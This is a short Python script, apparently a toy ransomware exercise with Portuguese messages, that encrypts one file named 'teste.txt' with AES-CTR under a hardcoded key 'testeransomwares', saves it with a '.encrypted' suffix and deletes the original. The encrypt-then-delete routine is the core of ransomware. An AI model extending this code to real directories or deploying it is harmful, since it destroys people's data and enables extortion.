import os
import pyaes

def encrypt_file(file_name, key):
    try:

        with open(file_name, "rb") as file:
            file_data = file.read()

        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        new_file_name = file_name + ".encrypted"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        os.remove(file_name)
        print(f"Arquivo '{file_name}' criptografado com sucesso e salvo como '{new_file_name}'.")

    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

key = b"testeransomwares"

file_name = "teste.txt"

encrypt_file(file_name, key)
